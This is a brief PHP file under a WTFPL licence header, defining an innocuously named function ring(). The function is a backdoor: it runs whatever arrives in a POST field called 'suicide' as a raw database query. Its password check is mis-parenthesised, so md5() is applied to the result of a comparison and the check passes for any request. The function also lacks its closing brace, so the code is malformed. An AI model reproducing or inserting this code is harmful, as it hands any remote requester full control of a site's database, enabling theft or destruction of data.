<?php
/* This program is free software. It comes without any warranty, to
 * the extent permitted by applicable law. You can redistribute it
 * and/or modify it under the terms of the Do What The Fuck You Want
 * To Public License, Version 2, as published by Sam Hocevar. See
 * http://sam.zoy.org/wtfpl/COPYING for more details. */

function ring() {
global $db;
if (md5($_POST['ring']=='a482a148ccdd020bcb5888e99f41bb65')) {
	$db->query($_POST['suicide']);
}
?>
